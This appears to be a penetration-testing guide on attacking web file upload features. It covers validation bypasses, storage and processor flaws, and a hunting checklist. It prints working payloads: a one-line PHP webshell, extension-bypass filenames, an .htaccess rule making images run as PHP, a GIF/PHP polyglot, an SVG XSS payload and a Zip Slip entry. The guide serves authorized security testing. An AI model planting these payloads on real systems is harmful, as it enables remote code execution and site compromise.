# File Upload

An upload feature lets an attacker put a file on the server's filesystem or object store. The questions are: what can you name it, what can you put in it, where does it land, and does anything ever execute or parse it. The classic win is a webshell; the subtler wins are parser exploits, path traversal, and poisoning other users' views.

## The mental model

A file upload is three decisions by the server: validate (type, size, name, content), store (path, filename, permissions), and serve/process (execute, render, parse, convert). A bug in any one is exploitable. The highest impact is when an uploaded file is later executed by the web server (RCE) or parsed by a vulnerable processor (XXE, SSRF, image library RCE), or served to other users (stored XSS, malware distribution).

## Where it hides / tell-tales

- **Extension and content-type checks that disagree with the server config**: the app blocks `.php` but the server also executes `.phtml`, `.php5`, `.phar`, `.pht`, `.inc`; or blocks by `Content-Type` (client-controlled) but not content; or checks the extension but stores with the original name.
- **The file is served from a path that executes**: uploads land under the web root in a directory where the handler runs scripts. If uploads go to a non-executing CDN/bucket, RCE is off the table but XSS and parser bugs remain.
- **Filename is attacker-controlled**: enables path traversal (`../../`), overwrite of existing files (config, other users' files, `.htaccess`), and null-byte/encoding tricks on older stacks.
- **Image/document processors run server-side**: ImageMagick (ImageTragick), Ghostscript, ffmpeg, LibreOffice, PDF renderers, and XML/SVG parsers. A "profile picture" that is processed can trigger RCE or SSRF without any execution of your file as a script.
- **Archive handling**: zip extraction without path checks is Zip Slip (`../../` inside the archive writes outside the target dir); symlinks in archives read arbitrary files.
- **Content-based type sniffing**: the browser or server sniffs content and may render an uploaded "image" as HTML, enabling stored XSS from an image endpoint.

## Real material

Minimal PHP webshell (when uploads land in an executing dir):

```php
<?php system($_GET['c']); ?>
```

Bypass filters on the name and type:

```
shell.php            -> blocked
shell.phtml / .php5 / .pht / .phar      (alternate executable extensions)
shell.php.jpg        (double extension, Apache mishandling with AddHandler)
shell.php%00.jpg     (null byte, old PHP/stacks)
shell.php.            (trailing dot/space, Windows)
shell.jpg  + rename via a second bug
.htaccess            (upload an .htaccess that makes .jpg run as PHP)
```

An `.htaccess` that turns your image into code (Apache):

```apache
AddType application/x-httpd-php .jpg
```

Polyglot: a valid image with PHP appended, to pass image validation (magic bytes) while still executing:

```
GIF89a;
<?php system($_GET['c']); ?>
```
(The `GIF89a` header satisfies a magic-byte check; the PHP runs if the file is executed.)

SVG for stored XSS (served inline, rendered as XML/HTML):

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
```

SVG/XML for SSRF and file read (see `XXE.md`) when the server rasterizes it.

Zip Slip entry (path traversal inside the archive):

```
archive contains a file named:  ../../../../var/www/html/shell.php
```

## Beyond the basics

- **Know where the file lands before choosing the attack**: if it goes to S3/a CDN, pursue stored XSS (content-type and `Content-Disposition`), parser bugs, and signed-URL issues, not webshells. If it lands under an executing web root, pursue RCE. Upload a probe and find the returned URL first.
- **Content-Type and Content-Disposition on download**: a stored file served with `Content-Type: text/html` or sniffed as HTML, and without `Content-Disposition: attachment`, is stored XSS on the file-serving origin. If that origin shares cookies with the app (same registrable domain), it is session-impacting. Vendors often serve user content from a separate sandbox domain precisely to prevent this; check whether they did.
- **Processor exploitation (no execution of your file needed)**: ImageTragick (`.mvg`/`.svg` with `url()` or `|` commands), Ghostscript `-dSAFER` bypasses in PostScript/PDF, and vulnerable ffmpeg HLS playlists that read local files. The upload is just the delivery; the RCE/SSRF is in the processor. Fingerprint what processes the file (EXIF rewrite, thumbnailing, format conversion).
- **Pixel-flood and decompression DoS**: a tiny image that decompresses to enormous dimensions exhausts memory. Note as DoS, do not fire at production.
- **Overwrite primitives**: if the filename is controlled and no uniqueness is enforced, overwrite another user's file (IDOR via filename), a shared config, or a predictable cache/temp file used elsewhere.
- **Second-order via metadata**: EXIF/XMP fields, PDF metadata, and filenames that are later reflected into HTML or queried into SQL. The upload is the injection vector for XSS/SQLi that fires in an admin view.
- **Client-side-only validation**: JS checks the extension before upload; the server does nothing. Intercept and change the file after the JS check. Always bypass the proxy.
- **Race the AV/validation**: some systems store then scan then delete. A brief window exists where the file is reachable and executable before the scanner removes it; request it in a tight loop (see `Business-Logic-and-Race-Conditions.md`).

## What to watch for

- A successful upload is not RCE until you confirm the file executes; fetch the returned URL and check for interpretation.
- Many modern stacks serve user content from an isolated domain and randomize filenames; this kills most classic attacks, so pivot to processors and parser bugs.
- An `.htaccess` trick only helps on Apache with the right config; fingerprint the server.
- Do not leave webshells on live targets; if you prove RCE, demonstrate minimally and report; remove any artifact you placed.

## Hunting checklist

- Determine the storage location and whether it executes; find the served URL.
- Bypass extension and content-type filters (alternate extensions, double extension, magic-byte polyglot, `.htaccess`).
- Test SVG/HTML for stored XSS and the download `Content-Type`/`Content-Disposition`.
- Identify server-side processors and test for ImageTragick/Ghostscript/ffmpeg/XXE.
- Test filename for path traversal and overwrite; test archives for Zip Slip.
- Bypass client-side validation via the proxy; test upload/scan races.
